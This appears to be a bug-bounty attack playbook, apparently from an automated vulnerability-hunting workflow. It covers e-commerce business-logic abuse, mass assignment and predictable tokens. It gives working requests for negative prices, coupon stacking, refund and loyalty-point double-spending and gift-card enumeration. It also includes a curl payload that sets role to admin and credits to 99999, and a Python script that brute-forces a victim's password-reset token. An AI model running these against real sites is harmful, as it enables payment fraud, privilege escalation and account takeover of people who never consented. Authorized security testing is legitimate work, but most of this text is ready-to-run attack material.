# ZDH Phase 9, 27: Business Logic + Mass Assignment + Insecure Randomness

## Phase 9 - Business Logic Exploitation

**Scanners NEVER find these. Highest payout-per-hour in e-commerce bug bounty.**

```bash
# 1. Negative quantity / price manipulation
POST /cart/add  {"product_id": 123, "quantity": -1}
POST /checkout  {"price": -99.99}  # becomes credit?
# Expected: 400 error. Vulnerable: proceeds with negative total

# 2. Integer overflow in quantity
POST /cart/add  {"quantity": 9999999999}
# Can cause price to overflow to 0 or negative

# 3. Coupon / promo code stacking
POST /checkout  {"coupons": ["CODE1", "CODE1", "CODE1"]}  # same code 3x
POST /checkout  {"coupons": ["CODE1", "CODE2"]}  # if each gives 50% off = 100% off?

# 4. Refund after order modification
# 1. Place order for $100 item
# 2. Modify order to remove expensive item (replace with $1 item)
# 3. Request full refund - does it refund $100 for a $1 order?

# 5. Loyalty points double-spend
# 1. Redeem points in checkout
# 2. Quickly cancel order
# 3. Are points restored AND charged?
# Use race condition: fire cancel+refund simultaneously

# 6. Price reference race condition
# Add item at sale price -> sale ends -> checkout still has old price?
# Time between add-to-cart and checkout

# 7. Currency arbitrage
# Is price calculated server-side per currency, or stored at add-to-cart?
# Add to cart in currency A (cheap), checkout in currency B (expensive)

# 8. Referral fraud
POST /referral/apply  {"referral_code": <your_own_referral_code>}
# Can you refer yourself?

# 9. Gift card enumeration
GET /giftcard/balance?code=GIFT0000000001  # sequential codes?
# If codes are sequential, enumerate entire space
```

## Phase 27 - Mass Assignment & Insecure Randomness

### Mass Assignment (OWASP API Top 10 2023)
```bash
# Concept: API auto-binds ALL JSON fields to model, including protected ones

# Step 1: GET /api/user/profile -> note fields in response (role, isAdmin, credits, plan)
# Step 2: Try sending those fields in PUT/POST:
curl -X PUT https://<target>/api/user/profile \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin","isAdmin":true,"credits":99999,"plan":"enterprise","emailVerified":true}'

# GraphQL mass assignment - try read-only fields in mutations:
mutation { updateUser(input: {id:"me", name:"test", role:"ADMIN", organizationRole:"owner"}) { id role } }

# Discover hidden fields with Arjun:
python3 arjun.py -u https://<target>/api/users -m POST --include '{"username":"x"}'

# Confirm: GET /api/user/profile -> check if role/isAdmin/credits changed
```

### Insecure Randomness & Predictable Tokens
```python
import requests, time, hashlib, itertools

# Collect 20 password reset tokens rapidly
tokens = []
for _ in range(20):
    r = requests.post("https://<target>/forgot-password", data={"email": "your@test.com"})
    # Extract token from email (use mailinator/temp mail)
    tokens.append(extract_token_from_email())

# Analyze patterns:
# 1. Sequential? Sort tokens, check if consecutive
# 2. Timestamp-based? Does token decode to current timestamp?
# 3. MD5/SHA of email+timestamp?
t = int(time.time())
for delta in range(-5, 5):
    candidate = hashlib.md5(f"victim@corp.com{t+delta}".encode()).hexdigest()
    r = requests.get(f"https://<target>/reset?token={candidate}")
    if r.status_code == 200: print(f"CONFIRMED: token = {candidate}")

# Math.random() state recovery (V8 engine - 10-15 observations enough):
# Tool: https://github.com/d0nutptr/v8_rand_buster
# If tokens generated via Math.random() in Node.js -> predict all future tokens

# UUID v1 (time-based) prediction:
# UUIDv1 contains: 60-bit timestamp + clock sequence + MAC address
# If two tokens share similar UUIDs -> timestamp extractable -> brute force range
import uuid
parsed = uuid.UUID(observed_token)
if parsed.version == 1:
    print(f"Timestamp: {parsed.time}")  # nanoseconds since Oct 1582
    # Enumerate nearby timestamp values to find other valid UUIDs
```

**Signal:** `emit_signal VULN_CONFIRMED "Business logic: <type> on <endpoint>" "main/zerodayhunt" 0.88`
